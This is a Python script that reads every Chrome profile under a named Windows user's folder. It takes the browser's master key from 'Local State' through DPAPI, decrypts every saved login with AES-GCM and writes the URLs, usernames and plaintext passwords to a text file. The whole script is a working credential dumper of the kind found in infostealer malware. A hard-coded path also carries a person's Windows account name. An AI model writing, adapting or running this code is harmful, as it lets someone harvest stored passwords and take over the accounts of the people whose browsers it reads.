import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

# 🔁 LOOP through all profiles
user_data_dir = r"C:\Users\Syeda Ayesha\AppData\Local\Google\Chrome\User Data"
profiles = [f for f in os.listdir(user_data_dir) if f.startswith("Profile") or f == "Default"]

def get_master_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception as e:
        return f"[ERROR: {str(e)}]"

# 🔐 Get master key once
master_key = get_master_key(os.path.join(user_data_dir, "Local State"))

with open("chrome_passwords.txt", "w", encoding="utf-8") as output:
    for profile in profiles:
        login_db_path = os.path.join(user_data_dir, profile, "Login Data")
        if not os.path.exists(login_db_path):
            continue

        try:
            shutil.copy2(login_db_path, "LoginVault.db")
            conn = sqlite3.connect("LoginVault.db")
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()

            output.write(f"\n===== Profile: {profile} =====\n")
            for row in rows:
                url, username, encrypted_password = row
                if encrypted_password:
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                else:
                    decrypted_password = "[No password]"

                output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*50}\n")

            cursor.close()
            conn.close()
            os.remove("LoginVault.db")
        except Exception as e:
            output.write(f"[Failed to process {profile}]: {str(e)}\n")
